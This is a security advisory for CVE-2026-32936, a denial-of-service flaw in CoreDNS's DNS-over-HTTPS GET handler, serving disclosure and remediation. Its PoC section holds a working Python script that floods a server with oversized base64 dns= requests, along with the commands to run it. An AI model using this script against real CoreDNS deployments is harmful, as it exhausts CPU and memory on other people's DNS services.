# [H] CoreDNS DoH GET oversized dns= query parameter causes pre-validation CPU and memory amplification

## Summary
Severity: High
Advisory: GHSA-63cw-r7xf-jmwr
CVE: CVE-2026-32936
CWE: CWE-400
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-28
Source: https://github.com/advisories/GHSA-63cw-r7xf-jmwr
Type: github-advisory

## Affected
- Go: `github.com/coredns/coredns` — affected >=0 <1.14.3

## Details
### Summary

CoreDNS's DNS-over-HTTPS (DoH) GET path accepts oversized `dns=` query values and performs substantial request parsing, query unescaping, base64 decoding, and message unpacking work before returning `400 Bad Request`.

A remote, unauthenticated attacker can repeatedly send oversized DoH GET requests to `/dns-query?dns=...` and force high CPU usage, large transient allocations, elevated garbage-collection pressure, and increased resident memory consumption even though the requests are ultimately rejected.

This is a denial-of-service issue caused by expensive pre-validation processing on the DoH GET path.

### Details

The vulnerable flow is in `plugin/pkg/doh/doh.go`:

- `RequestToMsg()` dispatches GET requests to `requestToMsgGet()`:
  - `plugin/pkg/doh/doh.go:79-89`
- `requestToMsgGet()` calls `req.URL.Query()`, extracts `dns`, and passes it directly to `base64ToMsg()`:
  - `plugin/pkg/doh/doh.go:99-108`
- `base64ToMsg()` decodes the full attacker-controlled value via `b64Enc.DecodeString()` and only then attempts to unpack it into a DNS message:
  - `plugin/pkg/doh/doh.go:121-130`

Relevant snippet:

```go
func requestToMsgGet(req *http.Request) (*dns.Msg, error) {
    values := req.URL.Query()
    b64, ok := values["dns"]
    if !ok {
        return nil, fmt.Errorf("no 'dns' query parameter found")
    }
    if len(b64) != 1 {
        return nil, fmt.Errorf("multiple 'dns' query values found")
    }
    return base64ToMsg(b64[0])
}

func base64ToMsg(b64 string) (*dns.Msg, error) {
    buf, err := b64Enc.DecodeString(b64)
    if err != nil {
        return nil, err
    }

    m := new(dns.Msg)
    err = m.Unpack(buf)

    return m, err
}
````

By contrast, the POST path applies a bounded read before unpacking:

```go
func toMsg(r io.ReadCloser) (*dns.Msg, error) {
    buf, err := io.ReadAll(http.MaxBytesReader(nil, r, 65536))
    if err != nil {
        return nil, err
    }
    m := new(dns.Msg)
    err = m.Unpack(buf)
    return m, err
}
```

So, POST is explicitly size-bounded, while GET is not equivalently bounded before expensive parsing and decoding work occurs.

In addition, the HTTPS server is created in `core/dnsserver/server_https.go:87-92` without an explicit early GET-path size guard in this path:

```go
srv := &http.Server{
    ReadTimeout:  s.ReadTimeout,
    WriteTimeout: s.WriteTimeout,
    IdleTimeout:  s.IdleTimeout,
    ErrorLog:     stdlog.New(&loggerAdapter{}, "", 0),
}
```

As a result, oversized DoH GET request targets are processed through:

1. HTTP request-line parsing
2. URL query parsing / unescaping
3. DoH GET extraction
4. base64 decoding
5. DNS message unpacking

before the request is rejected.

### Root cause

The root cause is missing early size validation on the DoH GET path.

More specifically:

* `requestToMsgGet()` performs `req.URL.Query()` on attacker-controlled oversized request targets.
* The extracted `dns` value is passed to `base64ToMsg()` without an encoded-length or decoded-length bound.
* `base64ToMsg()` fully decodes the attacker-controlled string before any DNS-size rejection.
* The POST path already has an explicit bounded read, but GET does not have an equivalent pre-decode bound.

This creates a pre-validation resource-amplification path for DoH GET.

### PoC

#### Local test setup

I reproduced this locally against CoreDNS 1.14.2 over HTTPS with `pprof` enabled.

Create a self-signed certificate:

```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 1 -nodes \
  -keyout key.pem -out cert.pem \
  -subj "/CN=127.0.0.1"
```

Create this `Corefile`:

```txt
https://127.0.0.1:8443 {
    whoami
    log
    errors
    tls cert.pem key.pem
    pprof 127.0.0.1:6060
}
```

Run CoreDNS:

```bash
./coredns -conf Corefile
```

#### Proof-of-concept script

```python
#!/usr/bin/env python3
import argparse
import base64
import collections
import concurrent.futures
import http.client
import ssl
import time

def send_one(host, port, path, timeout):
    ctx = ssl._create_unverified_context()
    conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
    try:
        conn.request("GET", path, headers={
            "Accept": "application/dns-message",
            "Connection": "close",
        })
        resp = conn.getresponse()
        resp.read()
        return resp.status
    except Exception as e:
        return f"ERR:{type(e).__name__}"
    finally:
        try:
            conn.close()
        except Exception:
            pass

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--decoded-kib", type=int, default=720)
    ap.add_argument("--workers", type=int, default=64)
    ap.add_argument("--requests", type=int, default=5000)
    ap.add_argument("--timeout", type=float, default=5.0)
    args = ap.parse_args()

    raw = b"A" * (args.decoded_kib * 1024)
    b64 = base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
    path = "/dns-query?dns=" + b64

    print(f"[+] target = https://{args.host}:{args.port}")
    print(f"[+] decoded bytes = {len(raw):,}")
    print(f"[+] encoded chars = {len(b64):,}")
    print(f"[+] request-target length = {len(path):,}")
    print(f"[+] workers = {args.workers}, requests = {args.requests}")
    print("[+] 400 responses are expected; the issue is expensive processing before rejection.\n")

    started = time.time()
    results = collections.Counter()

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = [
            ex.submit(send_one, args.host, args.port, path, args.timeout)
            for _ in range(args.requests)
        ]
        for i, fut in enumerate(concurrent.futures.as_completed(futs), 1):
            results[fut.result()] += 1
            if i % 10 == 0 or i == args.requests:
                print(f"[{i}/{args.requests}] {dict(results)}")

    elapsed = time.time() - started
    print("\n[+] done")
    print(f"[+] elapsed = {elapsed:.2f}s")
    print(f"[+] summary = {dict(results)}")

if __name__ == "__main__":
    main()
```

Run the PoC:

```bash
python3 poc_doh_get_oversize_https.py \
  --host 127.0.0.1 \
  --port 8443 \
  --decoded-kib 720 \
  --workers 64 \
  --requests 5000
```

#### Profiling commands used during reproduction

CPU profile:

```bash
(curl -s "http://127.0.0.1:6060/debug/pprof/profile?seconds=20" -o cpu_attack.pb.gz &) ; \
sleep 1 ; \
python3 poc_doh_get_oversize_https.py --host 127.0.0.1 --port 8443 --decoded-kib 720 --workers 64 --requests 5000 ; \
wait

go tool pprof -top ./coredns cpu_attack.pb.gz
```

Heap / allocation profiles:

```bash
curl -s http://127.0.0.1:6060/debug/pprof/heap -o heap_before.pb.gz
curl -s http://127.0.0.1:6060/debug/pprof/allocs -o allocs_before.pb.gz

python3 poc_doh_get_oversize_https.py --host 127.0.0.1 --port 8443 --decoded-kib 720 --workers 64 --requests 5000

curl -s http://127.0.0.1:6060/debug/pprof/heap -o heap_after.pb.gz
curl -s http://127.0.0.1:6060/debug/pprof/allocs -o allocs_after.pb.gz

go tool pprof -top -base heap_before.pb.gz ./coredns heap_after.pb.gz
go tool pprof -top -base allocs_before.pb.gz ./coredns allocs_after.pb.gz
```

### Reproduction results

I confirmed the issue on:

* CoreDNS 1.14.2
* linux/amd64
* go1.26.1

PoC payload characteristics:

* decoded payload size: `737,280 bytes`
* base64url-encoded `dns` length: `983,040`
* request-target length: `983,055`

Observed request outcome:

* `5000 / 5000` requests returned `400 Bad Request`
* total runtime for the 5000-request run: `18.22s`

The important point is that the requests are rejected only after expensive processing has already happened.

#### CPU profile highlights

The CPU profile captured during the attack showed significant time in:

* `net/http.readRequest`
* `net/url.ParseQuery` / `net/url.QueryUnescape` / `net/url.unescape`
* `github.com/coredns/coredns/plugin/pkg/doh.requestToMsgGet`
* `github.com/coredns/coredns/plugin/pkg/doh.base64ToMsg`
* `encoding/base64.(*Encoding).DecodeString`
* Go GC worker paths

Representative cumulative values from the captured profile included:

* `github.com/coredns/coredns/core/dnsserver.(*ServerHTTPS).ServeHTTP` → `10.91s`
* `github.com/coredns/coredns/plugin/pkg/doh.RequestToMsg` → `10.88s`
* `github.com/coredns/coredns/plugin/pkg/doh.requestToMsgGet` → `10.88s`
* `github.com/coredns/coredns/plugin/pkg/doh.base64ToMsg` → `3.50s`
* `encoding/base64.(*Encoding).DecodeString` → `3.46s`
* `net/http.readRequest` → `10.57s`
* `net/url.(*URL).Query` / `ParseQuery` / `QueryUnescape` → `7.38s`
* `runtime.gcBgMarkWorker` and related GC paths were also heavily active

This demonstrates that the issue is not limited to final DNS unpacking. The oversized GET request forces meaningful work in HTTP parsing, URL handling, base64 decoding, and garbage collection before rejection.

#### Allocation profile highlights

Allocation profiling showed very large transient allocation volume caused by the rejected requests:

* total `alloc_space`: `26,756.48 MB`

Top contributors included:

* `net/textproto.(*Reader).readLineSlice` → `19,668.19 MB`
* `net/textproto.(*Reader).ReadLine` → `3,738.84 MB`
* `encoding/base64.(*Encoding).DecodeString` → `2,766.16 MB`

Within the CoreDNS DoH GET path specifically:

* `github.com/coredns/coredns/plugin/pkg/doh.RequestToMsg` → `2,775.67 MB`
* `github.com/coredns/coredns/plugin/pkg/doh.requestToMsgGet` → `2,775.67 MB`
* `github.com/coredns/coredns/plugin/pkg/doh.base64ToMsg` → `2,773.67 MB`

Heap delta (`inuse_space`) also showed live growth attributable to this path, including:

* `encoding/base64.(*Encoding).DecodeString` → `7,629.75 kB`

#### Memory observations

Runtime memory monitoring showed a clear increase in peak resident usage during the attack:

* baseline `VmHWM / VmRSS` before load was approximately `55,864 kB`
* observed `VmHWM` during testing reached approximately `146,100 kB`

So even though requests returned `400`, the server still experienced substantial transient memory growth and allocator / GC pressure before rejection.

### Impact

A remote, unauthenticated attacker can repeatedly send oversized DoH GET requests to the HTTPS endpoint and force significant pre-rejection work.

Impact includes:

* elevated CPU consumption
* large transient allocations
* increased garbage-collection pressure
* higher peak resident memory usage
* degraded throughput and responsiveness
* denial of service risk on memory-constrained or heavily loaded deployments

This is especially relevant for internet-facing DoH deployments, where an attacker can repeatedly trigger the GET parsing path without authentication.

The fact that the final HTTP status is `400 Bad Request` does not mitigate the issue, because the expensive processing has already occurred before the rejection is generated.

### Suggested remediation

A robust fix should address both stages of the problem:

1. Apply an early bound on the DoH GET request target / raw query length before expensive query parsing.
2. Enforce an encoded-length and decoded-length limit for the `dns` parameter before calling `DecodeString()`.
3. Preserve equivalent size constraints across GET and POST paths.

A minimal hardening direction would be:

* reject oversized GET requests before `req.URL.Query()` on the DoH path
* reject `dns` values whose encoded length exceeds the maximum valid DNS message encoding
* reject any decoded payload larger than the supported DNS message size before unpacking

---

**Credit request: When referencing, republishing, or issuing downstream advisories for this vulnerability, please preserve the original researcher credit as Ali Firas (thesmartshadow).**

## References
- https://github.com/coredns/coredns/security/advisories/GHSA-63cw-r7xf-jmwr
- https://nvd.nist.gov/vuln/detail/CVE-2026-32936
- https://github.com/coredns/coredns
- https://github.com/coredns/coredns/releases/tag/v1.14.3
